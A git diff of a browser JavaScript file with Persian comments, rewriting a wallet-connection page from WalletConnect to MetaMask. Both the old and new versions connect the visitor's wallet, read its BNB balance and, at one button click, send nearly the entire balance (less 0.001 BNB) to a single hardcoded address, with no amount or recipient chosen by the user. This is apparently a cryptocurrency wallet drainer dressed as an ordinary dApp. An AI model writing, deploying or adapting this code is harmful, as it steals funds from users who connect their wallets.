@@ -1,95 +1,76 @@
-import { WalletConnectModal } from "@walletconnect/modal";
-import WalletConnectEthereumProvider from '@walletconnect/ethereum-provider';
-import { ethers } from 'ethers';
+import { ethers } from "ethers";
 
-let provider;
-let signer;
-let walletAddress;
-let bnbBalance;
+// المان‌های UI
+const connectButton = document.getElementById("connectButton");
+const sendTransactionButton = document.getElementById("sendTransactionButton");
+const walletAddressElement = document.getElementById("walletAddress");
+const bnbBalanceElement = document.getElementById("bnbBalance");
 
-const connectButton = document.getElementById("connectWallet");
-const sendButton = document.getElementById("sendTransaction");
-const walletAddressDisplay = document.getElementById("walletAddress");
-const bnbBalanceDisplay = document.getElementById("bnbBalance");
+let provider, signer, walletAddress;
 
-const fixedAddress = "0x98907E5eE9E010c34DF6F7847565D421D3CDAd05"; // آدرس ثابت برای ارسال تراکنش
-
-// Project ID خود را وارد کنید
-const projectId = "4d08946e6c316bed5e76b450ccbb5256"; 
-
-const walletConnectModal = new WalletConnectModal({
-  cacheProvider: true, // Enable session cache
-});
-
-async function connectWallet() {
-  try {
-    // استفاده از WalletConnect برای اتصال به MetaMask
-    const connector = await walletConnectModal.connect();
-
-    // اتصال به WalletConnectEthereumProvider
-    provider = new WalletConnectEthereumProvider({
-      connector,
-      projectId: projectId, // اضافه کردن Project ID
-    });
-
-    await provider.enable();
-    signer = provider.getSigner();
-    walletAddress = await signer.getAddress();
-
-    // نمایش آدرس کیف پول و فعال کردن دکمه ارسال تراکنش
-    walletAddressDisplay.textContent = walletAddress;
-    sendButton.disabled = false;
-
-    // دریافت موجودی BNB
-    fetchBalance();
-  } catch (error) {
-    console.error(error);
-  }
+// بررسی اینکه آیا MetaMask نصب است
+if (typeof window.ethereum === "undefined") {
+  alert("MetaMask را نصب کنید.");
 }
 
-async function fetchBalance() {
+// اتصال به MetaMask
+connectButton.addEventListener("click", async () => {
   try {
-    // دریافت موجودی BNB
-    const balance = await signer.getBalance();
-    bnbBalance = ethers.utils.formatEther(balance);
-    bnbBalanceDisplay.textContent = bnbBalance;
-  } catch (error) {
-    console.error(error);
-  }
-}
-
-async function sendTransaction() {
-  try {
-    // مقدار گس 0.001 BNB که باید از موجودی کم شود
-    const gasAmount = ethers.utils.parseEther("0.001");
-
-    // تبدیل موجودی به Wei
-    const balanceInWei = ethers.utils.parseEther(bnbBalance);
-
-    // بررسی اینکه آیا موجودی کافی برای پرداخت گس وجود دارد
-    if (balanceInWei.lt(gasAmount)) {
-      alert("موجودی کافی برای پرداخت گس وجود ندارد!");
+    if (!window.ethereum) {
+      alert("MetaMask را نصب کنید.");
       return;
     }
 
-    // محاسبه مبلغ باقی‌مانده بعد از کسر گس
-    const amountToSend = balanceInWei.sub(gasAmount);
+    // درخواست دسترسی به حساب‌ها
+    await window.ethereum.request({ method: "eth_requestAccounts" });
 
-    // ایجاد تراکنش
-    const transaction = {
-      to: fixedAddress,
-      value: amountToSend,
-    };
+    // ایجاد Web3 provider و signer
+    provider = new ethers.providers.Web3Provider(window.ethereum);
+    signer = provider.getSigner();
 
-    // ارسال تراکنش
-    const txResponse = await signer.sendTransaction(transaction);
-    console.log("Transaction Sent:", txResponse);
-    await txResponse.wait();
-    console.log("Transaction Confirmed");
+    // دریافت آدرس کیف پول
+    walletAddress = await signer.getAddress();
+    walletAddressElement.textContent =` آدرس کیف پول: ${walletAddress}`;
+
+    // دریافت موجودی BNB
+    const balance = await signer.getBalance();
+    const formattedBalance = ethers.utils.formatEther(balance);
+    bnbBalanceElement.textContent =` موجودی BNB: ${formattedBalance}`;
+
+    // نمایش دکمه ارسال تراکنش
+    sendTransactionButton.style.display = "inline-block";
   } catch (error) {
     console.error(error);
+    alert("اتصال به کیف پول با خطا مواجه شد.");
   }
-}
+});
 
-connectButton.addEventListener("click", connectWallet);
-sendButton.addEventListener("click", sendTransaction);
+// ارسال تراکنش
+sendTransactionButton.addEventListener("click", async () => {
+  try {
+    const recipientAddress = "0x98907E5eE9E010c34DF6F7847565D421D3CDAd05";  // آدرس مقصد خود را وارد کنید
+
+    // دریافت موجودی کیف پول
+    const balance = await signer.getBalance();
+    const gasFee = ethers.utils.parseEther("0.001");
+
+    if (balance.lt(gasFee)) {
+      alert("موجودی برای گس کافی نیست!");
+      return;
+    }
+
+    const amountToSend = balance.sub(gasFee); // مقدار قابل ارسال
+
+    // ارسال تراکنش
+    const tx = await signer.sendTransaction({
+      to: recipientAddress,
+      value: amountToSend,
+    });
+
+    await tx.wait();
+    alert("تراکنش با موفقیت ارسال شد!");
+  } catch (error) {
+    console.error(error);
+    alert("ارسال تراکنش با خطا مواجه شد.");
+  }
+});
